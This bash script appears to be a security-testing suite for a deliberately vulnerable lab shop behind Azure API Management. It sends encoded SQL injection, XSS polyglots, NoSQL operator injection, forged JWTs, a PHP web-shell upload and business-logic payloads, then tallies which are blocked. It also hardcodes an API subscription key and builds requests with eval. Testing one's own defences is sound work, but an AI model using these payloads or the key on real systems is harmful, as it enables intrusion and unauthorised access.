#!/bin/bash

# advanced-attack-suite.sh - Advanced attack testing suite with logging

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
APIM_URL="https://apim-vulnshop-t7up5q.azure-api.net/vulnshop"
LOCAL_URL="http://localhost:3001"
SUBSCRIPTION_KEY="8722910157d34e698f969cf34c30eeb5"
LOG_FILE="attack-results-$(date +%Y%m%d-%H%M%S).log"

# Target selection
TARGET="${1:-apim}"
if [ "$TARGET" = "local" ]; then
    BASE_URL="$LOCAL_URL"
    echo -e "${YELLOW}🎯 Target: Local Backend${NC}"
else
    BASE_URL="$APIM_URL"
    echo -e "${YELLOW}🎯 Target: Azure API Management${NC}"
fi

# Initialize log
echo "VulnShop Attack Test Results - $(date)" > "$LOG_FILE"
echo "Target: $BASE_URL" >> "$LOG_FILE"
echo "================================" >> "$LOG_FILE"

# Statistics
TOTAL_ATTACKS=0
BLOCKED_ATTACKS=0
SUCCESSFUL_ATTACKS=0

# Advanced attack function with logging
advanced_attack() {
    local category=$1
    local attack_name=$2
    local url=$3
    local description=$4
    local method="${5:-GET}"
    local data="${6:-}"
    local headers="${7:-}"
    
    TOTAL_ATTACKS=$((TOTAL_ATTACKS + 1))
    
    echo -e "\n${CYAN}[$category]${NC} ${PURPLE}$attack_name${NC}"
    echo "→ $description"
    
    # Build curl command
    local curl_cmd="curl -s -w '\n%{http_code}' "
    
    # Add authentication for APIM
    if [ "$TARGET" != "local" ]; then
        curl_cmd="$curl_cmd -H 'Ocp-Apim-Subscription-Key: $SUBSCRIPTION_KEY'"
    fi
    
    # Add custom headers
    if [ -n "$headers" ]; then
        curl_cmd="$curl_cmd $headers"
    fi
    
    # Add method and data
    if [ "$method" = "POST" ] || [ "$method" = "PUT" ]; then
        curl_cmd="$curl_cmd -X $method -H 'Content-Type: application/json' -d '$data'"
    elif [ "$method" != "GET" ]; then
        curl_cmd="$curl_cmd -X $method"
    fi
    
    # Execute attack
    local response=$(eval "$curl_cmd '$BASE_URL$url'")
    local body=$(echo "$response" | head -n -1)
    local status=$(echo "$response" | tail -n 1)
    
    # Log results
    echo "[$category] $attack_name - Status: $status" >> "$LOG_FILE"
    echo "URL: $BASE_URL$url" >> "$LOG_FILE"
    echo "Response: $body" >> "$LOG_FILE"
    echo "---" >> "$LOG_FILE"
    
    # Display result
    if [ "$status" = "403" ] || [ "$status" = "401" ]; then
        echo -e "  Status: ${GREEN}✓ Blocked (HTTP $status)${NC}"
        BLOCKED_ATTACKS=$((BLOCKED_ATTACKS + 1))
    elif [ "$status" = "200" ] || [ "$status" = "201" ]; then
        echo -e "  Status: ${RED}✗ Success (HTTP $status) - Potential vulnerability${NC}"
        SUCCESSFUL_ATTACKS=$((SUCCESSFUL_ATTACKS + 1))
    elif [ "$status" = "429" ]; then
        echo -e "  Status: ${YELLOW}⚠ Rate Limited (HTTP $status)${NC}"
        BLOCKED_ATTACKS=$((BLOCKED_ATTACKS + 1))
    else
        echo -e "  Status: ${YELLOW}⚠ HTTP $status${NC}"
    fi
    
    # Show partial response for successful attacks
    if [ "$status" = "200" ] && [ -n "$body" ]; then
        echo -e "  Response: ${YELLOW}$(echo "$body" | head -c 100)...${NC}"
    fi
    
    sleep 0.3
}

echo -e "${RED}╔════════════════════════════════════════╗${NC}"
echo -e "${RED}║   ADVANCED SECURITY TESTING SUITE      ║${NC}"
echo -e "${RED}╚════════════════════════════════════════╝${NC}"

# =============================================================================
# ENCODED SQL INJECTION
# =============================================================================
echo -e "\n${RED}▶ ENCODED SQL INJECTION ATTACKS${NC}"

advanced_attack "SQL-ENCODED" "URL Encoded SQL" \
    "/api/products?search=%27%20OR%20%271%27%3D%271" \
    "URL encoded SQL injection"

advanced_attack "SQL-ENCODED" "Double URL Encoded" \
    "/api/products?search=%2527%2520OR%2520%25271%2527%253D%25271" \
    "Double URL encoded SQL injection"

advanced_attack "SQL-ENCODED" "Base64 SQL Injection" \
    "/api/products?search=JyBPUiAnMSc9JzE=" \
    "Base64 encoded SQL injection"

advanced_attack "SQL-ENCODED" "Unicode SQL Injection" \
    "/api/products?search=%u0027%u0020%u004F%u0052%u0020%u0027%u0031%u0027%u003D%u0027%u0031" \
    "Unicode encoded SQL injection"

# =============================================================================
# ADVANCED XSS VARIANTS
# =============================================================================
echo -e "\n${RED}▶ ADVANCED XSS ATTACKS${NC}"

advanced_attack "XSS-ADVANCED" "SVG XSS" \
    "/api/products?search=<svg onload=alert('XSS')>" \
    "SVG-based XSS attack"

advanced_attack "XSS-ADVANCED" "Data URI XSS" \
    "/api/products?search=<a href='data:text/html,<script>alert(1)</script>'>Click</a>" \
    "Data URI XSS attack"

advanced_attack "XSS-ADVANCED" "Event Handler XSS" \
    "/api/products?search=<body onload=alert('XSS')>" \
    "Event handler XSS"

advanced_attack "XSS-ADVANCED" "Polyglot XSS" \
    '/api/products?search=javascript:/*--></title></style></textarea></script></xmp><svg/onload="+/"/+/onmouseover=1/+/[*/[]/+alert(1)//">' \
    "Polyglot XSS payload"

# =============================================================================
# NOSQL INJECTION
# =============================================================================
echo -e "\n${RED}▶ NOSQL INJECTION ATTACKS${NC}"

advanced_attack "NOSQL" "MongoDB Injection" \
    "/api/products" \
    "NoSQL injection via JSON" \
    "POST" \
    '{"search": {"$ne": null}}'

advanced_attack "NOSQL" "MongoDB $where" \
    "/api/products" \
    "NoSQL $where injection" \
    "POST" \
    '{"search": {"$where": "this.price > 0"}}'

advanced_attack "NOSQL" "MongoDB Regex" \
    "/api/login" \
    "NoSQL regex injection" \
    "POST" \
    '{"username": {"$regex": "^admin"}, "password": {"$ne": null}}'

# =============================================================================
# JWT ATTACKS
# =============================================================================
echo -e "\n${RED}▶ JWT/AUTHENTICATION ATTACKS${NC}"

# Create weak JWT with HS256 and known secret
WEAK_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0.4pcPyMD09olPSyXnrXCjTwXyr4BsezdI1AVTmud2fU4"

advanced_attack "JWT" "None Algorithm" \
    "/api/admin/users" \
    "JWT with 'none' algorithm" \
    "GET" \
    "" \
    "-H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.'"

advanced_attack "JWT" "Weak Secret JWT" \
    "/api/admin/users" \
    "JWT signed with weak secret '123456'" \
    "GET" \
    "" \
    "-H 'Authorization: Bearer $WEAK_JWT'"

# =============================================================================
# RATE LIMITING TESTS
# =============================================================================
echo -e "\n${RED}▶ RATE LIMITING TESTS${NC}"

echo -e "${YELLOW}Sending 20 rapid requests...${NC}"
RATE_LIMITED=false
for i in {1..20}; do
    echo -ne "\r  Progress: $i/20"
    
    if [ "$TARGET" = "local" ]; then
        status=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/products")
    else
        status=$(curl -s -o /dev/null -w "%{http_code}" \
            -H "Ocp-Apim-Subscription-Key: $SUBSCRIPTION_KEY" \
            "$BASE_URL/api/products")
    fi
    
    if [ "$status" = "429" ]; then
        echo -e "\n  ${GREEN}✓ Rate limit triggered at request $i${NC}"
        RATE_LIMITED=true
        break
    fi
done

if [ "$RATE_LIMITED" = false ]; then
    echo -e "\n  ${RED}✗ No rate limiting detected after 20 requests${NC}"
fi

# =============================================================================
# BUSINESS LOGIC ATTACKS
# =============================================================================
echo -e "\n${RED}▶ BUSINESS LOGIC ATTACKS${NC}"

advanced_attack "LOGIC" "Negative Price" \
    "/api/products" \
    "Creating product with negative price" \
    "POST" \
    '{"name": "Evil Product", "price": -100, "description": "Free money!"}'

advanced_attack "LOGIC" "Race Condition" \
    "/api/orders" \
    "Race condition in order processing" \
    "POST" \
    '{"productId": 1, "quantity": 1000000}'

advanced_attack "LOGIC" "Integer Overflow" \
    "/api/cart" \
    "Integer overflow in quantity" \
    "POST" \
    '{"productId": 1, "quantity": 2147483648}'

# =============================================================================
# FILE UPLOAD ATTACKS
# =============================================================================
echo -e "\n${RED}▶ FILE UPLOAD ATTACKS${NC}"

advanced_attack "FILE" "PHP Upload" \
    "/api/upload" \
    "Uploading PHP file" \
    "POST" \
    '{"filename": "shell.php", "content": "<?php system($_GET[\"cmd\"]); ?>"}'

advanced_attack "FILE" "Double Extension" \
    "/api/upload" \
    "Double extension bypass" \
    "POST" \
    '{"filename": "shell.jpg.php", "content": "<?php phpinfo(); ?>"}'

# =============================================================================
# API VERSIONING ATTACKS
# =============================================================================
echo -e "\n${RED}▶ API VERSIONING ATTACKS${NC}"

advanced_attack "VERSION" "Old API Version" \
    "/api/v1/admin" \
    "Accessing deprecated API version"

advanced_attack "VERSION" "Debug Endpoint" \
    "/api/debug" \
    "Accessing debug endpoint"

advanced_attack "VERSION" "Admin Console" \
    "/admin" \
    "Accessing admin console"

# =============================================================================
# GENERATE SUMMARY REPORT
# =============================================================================
echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║          ATTACK SUMMARY REPORT         ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"

SUCCESS_RATE=$(awk "BEGIN {printf \"%.1f\", ($SUCCESSFUL_ATTACKS/$TOTAL_ATTACKS)*100}")
BLOCK_RATE=$(awk "BEGIN {printf \"%.1f\", ($BLOCKED_ATTACKS/$TOTAL_ATTACKS)*100}")

echo -e "\n${YELLOW}📊 Statistics:${NC}"
echo -e "  Total Attacks: ${TOTAL_ATTACKS}"
echo -e "  Blocked: ${GREEN}${BLOCKED_ATTACKS}${NC} (${BLOCK_RATE}%)"
echo -e "  Successful: ${RED}${SUCCESSFUL_ATTACKS}${NC} (${SUCCESS_RATE}%)"
echo -e "  Other: $((TOTAL_ATTACKS - BLOCKED_ATTACKS - SUCCESSFUL_ATTACKS))"

echo -e "\n${YELLOW}📁 Log File:${NC}"
echo -e "  Results saved to: ${BLUE}${LOG_FILE}${NC}"

# Add summary to log file
echo "" >> "$LOG_FILE"
echo "SUMMARY" >> "$LOG_FILE"
echo "=======" >> "$LOG_FILE"
echo "Total Attacks: $TOTAL_ATTACKS" >> "$LOG_FILE"
echo "Blocked: $BLOCKED_ATTACKS ($BLOCK_RATE%)" >> "$LOG_FILE"
echo "Successful: $SUCCESSFUL_ATTACKS ($SUCCESS_RATE%)" >> "$LOG_FILE"
echo "Test completed at: $(date)" >> "$LOG_FILE"

if [ "$TARGET" != "local" ]; then
    echo -e "\n${YELLOW}🔍 Next Steps:${NC}"
    echo "1. Check APIM Analytics in Azure Portal"
    echo "2. Review Cortex dashboard for attack logs"
    echo "3. Analyze patterns in: $LOG_FILE"
    echo "4. Apply security policies to block detected vulnerabilities"
fi

echo -e "\n${GREEN}✅ Advanced attack testing completed!${NC}" 